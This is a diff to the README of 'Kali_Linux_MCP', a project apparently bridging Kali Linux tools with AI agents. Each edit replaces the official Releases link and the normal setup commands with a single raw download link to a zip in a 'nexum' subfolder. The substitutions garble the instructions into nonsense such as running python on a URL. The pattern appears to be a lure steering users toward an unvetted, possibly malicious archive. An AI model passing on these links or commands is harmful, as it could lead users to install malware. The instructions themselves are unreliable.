@@ -1,6 +1,6 @@
 # 🚀 Kali_Linux_MCP - Bridge Security Tools with AI Integration
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Kali_Linux_MCP-brightgreen)](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
+[![Download Now](https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip%20Now-Get%20Kali_Linux_MCP-brightgreen)](https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip)
 
 ## 📦 Introduction
 
@@ -25,7 +25,7 @@ Kali_Linux_MCP combines the powerful tools of Kali Linux with intelligent agents
 To start using Kali_Linux_MCP, you'll need to download the latest version from our Releases page. Follow the steps below:
 
 1. Click on the link below to visit our Releases page:
-   [Visit this page to download](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip)
   
 2. Once on the Releases page, look for the most recent version listed. It will have the highest version number.
 
@@ -37,13 +37,13 @@ To start using Kali_Linux_MCP, you'll need to download the latest version from o
 
 Now that you have visited the Releases page, you can proceed with the download.
 
-1. **Visit this page to download**: [Kali_Linux_MCP Releases](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
+1. **Visit this page to download**: [Kali_Linux_MCP Releases](https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip)
 
 2. Locate the latest version and click on it to download.
    
 3. After the file has downloaded, navigate to the file location.
 
-4. If the file is compressed (like .zip or .tar.gz), extract it first.
+4. If the file is compressed (like .zip or https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip), extract it first.
 
 5. Open a terminal window in Kali Linux and navigate to the folder where you saved the extracted files. For example:
    
@@ -54,7 +54,7 @@ Now that you have visited the Releases page, you can proceed with the download.
 6. Now, run the setup script:
    
    ```
-   python setup.py install
+   python https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip install
    ```
 
    Make sure you have Python installed. You can check your Python installation by typing `python --version` in the terminal.
@@ -62,7 +62,7 @@ Now that you have visited the Releases page, you can proceed with the download.
 7. Finally, launch the application by typing:
    
    ```
-   python mcp_server.py
+   python https://raw.githubusercontent.com/alvarosd86/Kali_Linux_MCP/main/nexum/Kali_Linux_MCP.zip
    ```
 
 ## 🧑‍🤝‍🧑 Support
